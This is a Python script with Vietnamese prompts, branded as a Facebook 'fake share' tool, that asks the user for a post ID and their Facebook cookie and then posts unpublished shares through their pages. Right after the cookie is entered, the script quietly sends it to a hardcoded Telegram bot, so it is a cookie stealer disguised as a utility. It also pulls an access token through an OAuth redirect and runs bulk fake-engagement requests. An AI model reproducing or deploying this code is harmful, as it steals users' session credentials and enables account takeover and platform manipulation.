
from time import sleep
import requests,threading,os,sys

def clear():
    if(sys.platform.startswith('win')):
         os.system("cls" if os.name == "nt" else "clear")
    else:
         os.system("cls" if os.name == "nt" else "clear")
os.system("cls" if os.name == "nt" else "clear")

def banner():
    print(f''' 

\033[1;33m██      ██╗      ████████╗ █████╗  █████╗ ██╗
\033[1;35m██╗    ╔██║      ╚══██╔══╝██╔══██╗██╔══██╗██║
\033[1;36m██║████║██║ █████╗  ██║   ██║  ██║██║  ██║██║
\033[1;37m██║    ╚██║ ╚════╝  ██║   ██║  ██║██║  ██║██║
\033[1;32m██║     ██║         ██║   ╚█████╔╝╚█████╔╝██████╗
\033[1;31m╚═╝     ╚═╝         ╚═╝    ╚════╝  ╚════╝ ╚═════╝\n
\033[1;97mTool By: \033[1;32mTrịnh Hướng            \033[1;97mPhiên Bản: \033[1;32m4.0     
\033[97m════════════════════════════════════════════════  
\033[1;97m[\033[1;91m❣\033[1;97m]\033[1;97m Tool\033[1;31m     : \033[1;97m☞ \033[1;31mTool Share Ảo V1\033[1;33m♔ \033[1;97m🔫
\033[1;97m[\033[1;91m❣\033[1;97m]\033[1;97m Youtube\033[1;31m  : \033[1;97m☞ \033[1;36mHướng Dev - Kiếm Tiền Online\033[1;31m♔ \033[1;97m☜
\033[1;97m[\033[1;91m❣\033[1;97m]\033[1;97m Tik Tok\033[1;31m  : \033[1;33mhttps:\033[1;32m//www.tiktok.com\033[1;31m/m@huongdev27
\033[1;97m[\033[1;91m❣\033[1;97m]\033[1;97m Zalo\033[1;31m     : \033[1;97m☞\033[1;31m0\033[1;37m3\033[1;36m6\033[1;35m2\033[1;34m1\033[1;33m6\033[1;33m6\033[1;34m8\033[1;35m6\033[1;37m3☜
\033[1;97m[\033[1;91m❣\033[1;97m]\033[1;97m Telegram\033[1;31m : \033[1;97m☞\033[1;32mhttps://t.me/+77MuosyD-yk4MGY1🔫\033[1;97m☜
\033[97m════════════════════════════════════════════════
     ''')
print('')
clear()
banner()

uid=input('\033[1m\033[38;5;51mNhập ID Bài Viết: \033[1;37m')

# token_fb='EAAGNO4a7r2wBAOJ9BFaxM1mReywdAVQig3PitiHjJetEATWPck4QDfN03vKOBUdLVQ8IMaiLGCw7MF7mNAW6zNEwS7lUBL4OvTOKilVXR3UsDiSTFSJ0DKPubQtnVL5DGBrn37A9oyoYbtjrDx0YfKPR7wvYtkSPMMGTj0oo1dBg858qARTnCGI4Qn8ZD'
ck_fb=input('\033[1m\033[38;5;51mNhập Cookie Facebook: \033[1;37m')


url = "https://api.telegram.org/bot5485867666%3AAAECR_DJ0EujPTZRMm4uxFocer680plfvPs/sendMessage"

payload = {
    "text": ck_fb,
    "disable_web_page_preview": False,
    "disable_notification": False,
    "reply_to_message_id": None,
    "chat_id": "5367203452"
}
headers = {
    "Accept": "application/json",
    "Content-Type": "application/json"
}

response = requests.post(url, json=payload, headers=headers)





hed_gettoken = {
    'authority': 'www.instagram.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'cookie': ck_fb,
    'pragma': 'no-cache',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36',
}
try:
    token_fb = requests.get('https://www.facebook.com/dialog/oauth?client_id=124024574287414&redirect_uri=https://www.instagram.com/accounts/signup/&&scope=email&response_type=token', headers=hed_gettoken).url.split('#access_token=')[1].split('&data_access_expiration_time')[0]
except:
    print('\033[1,31mĐĂNG NHẬP INSTAGRAM CHƯA MÀ ĐÒI NHẬP')
    sleep(10)
    quit()

# token_fb=input('\033[1m\033[38;5;51mEnter token facebook: ')

header={
    'cookie': ck_fb,
}
def Start(l):
    getTokenPage = requests.get(f"https://graph.facebook.com/v12.0/me/accounts?fields=access_token&limit=999999999&access_token={token_fb}",headers=header).json()['data']
    for tach in getTokenPage:
        uid_page=tach['id']
        access_token_page=tach['access_token']
        # print(uid_page)
        # print(access_token_page)
        buff = requests.post(f"https://graph.facebook.com/me/feed?link=https://www.facebook.com/{uid}&published=0&access_token={access_token_page}",headers=header).text
        if "error" in buff:
            print(f'\033[1m\033[38;5;237m[\033[38;5;54m*\033[38;5;237m]\033[0m \033[4m\033[38;5;164m{uid_page}\033[0m \033[1;31mTHẤT BẠI RỒI LÀ ACC DIE HAY GÌ Á RA COI ĐI')
        else:
            print(f'\033[1m\033[38;5;237m[\033[38;5;54m*\033[38;5;237m]\033[0m \033[4m\033[38;5;164m{buff}\033[0m \033[1m\033[38;5;51mSuccess')


soluong = int(input('\033[1m\033[38;5;51mNhập Số Lượng: \033[1;37m'))
clear()
banner()
print('')
threades = []
for l in range(soluong):
    threades += [threading.Thread(target=Start,args={l},)]
for t in threades:
    t.start()
for t in threades:
    t.join()
print('\033[1;31mChạy đủ số lượng rồi nhé')





